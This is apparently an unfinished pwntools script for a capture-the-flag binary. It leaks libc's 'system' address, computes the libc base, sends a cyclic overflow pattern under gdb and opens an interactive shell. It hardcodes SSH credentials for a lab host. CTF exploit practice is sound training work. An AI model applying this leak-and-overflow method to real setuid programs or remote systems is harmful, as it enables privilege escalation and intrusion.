from pwn import *
import struct

context.terminal = ['tmux', 'new-window']
target = './pwn_me'
context.binary = target
binary = ELF(target)
libc = ELF("./libc.so.6")

ssh_host = '10.10.232.171'
ssh_user = 'guardian'
ssh_pass = 'GOg0esGrrr!'
ssh_port = 22

if args['SSH']:
    sh = ssh(host=ssh_host, user=ssh_user, password=ssh_pass, port=ssh_port)
    p = sh.run('/bin/bash')
    junk = p.recv(4096,timeout=2)
    p.sendline(target)
else:
    p = process(target,setuid=True)


p.recvline()
leak = p.recvline()[-11:].rstrip(b"\n")
system = int(leak[2:],16)
log.info(hex(system))
libc.address = system - libc.symbols['system']

buffer = b""
buffer += b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
gdb.attach(p, gdbscript='continue')
p.sendline(buffer)



p.interactive()
